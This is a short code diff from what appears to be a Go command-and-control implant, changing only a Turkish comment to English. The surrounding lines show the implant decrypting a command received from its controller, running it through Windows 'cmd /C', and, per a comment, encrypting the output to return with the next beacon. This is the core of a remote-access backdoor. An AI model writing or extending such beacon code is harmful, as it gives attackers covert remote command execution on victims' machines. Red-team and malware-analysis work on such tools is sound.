@@ -22,7 +22,7 @@ func main() {
 			decryptedCmd, _ := common.Decrypt(encryptedCmd)
 
 			// 3. Run the Command (e.g., Shell Command)
-			cmd := exec.Command("cmd", "/C", string(decryptedCmd)) // Windows için
+			cmd := exec.Command("cmd", "/C", string(decryptedCmd)) // for Windows OS
 			output, _ := cmd.CombinedOutput()
 
 			// 4. Encrypt the result and send it with the next beacon.
